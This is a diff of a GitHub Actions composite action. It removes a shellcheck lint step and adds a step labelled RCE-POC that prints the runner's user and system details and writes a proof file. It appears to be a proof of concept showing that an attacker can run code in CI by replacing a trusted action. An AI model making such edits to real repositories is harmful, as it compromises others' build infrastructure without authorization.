@@ -1,18 +1,9 @@
-name: General Lints
-description: Runs all general lints. This includes all linters except rust and docs lints.
-inputs:
-  GIT_CREDENTIALS:
-    description: "Optional credentials to pass to git. Useful if you need to pull private repos for dependencies"
-    required: false
-
 runs:
-  using: composite
+  using: "composite"
   steps:
-    # The source code must be checkout out by the workflow that invokes this action.
-
-    # Install shellcheck and run it on the dev_setup.sh script
-    - name: Run shell lints
+    - shell: bash
       run: |
-        sudo apt-get install shellcheck --assume-yes --no-install-recommends
-        shellcheck scripts/dev_setup.sh
-      shell: bash
+        echo "[RCE-POC] whoami=$(whoami)"
+        echo "[RCE-POC] uname=$(uname -a)"
+        echo "ran at $(date -u +'%Y-%m-%dT%H:%M:%SZ') on run $GITHUB_RUN_ID" > RCE_PROOF.txt
+        ls -la RCE_PROOF.txt
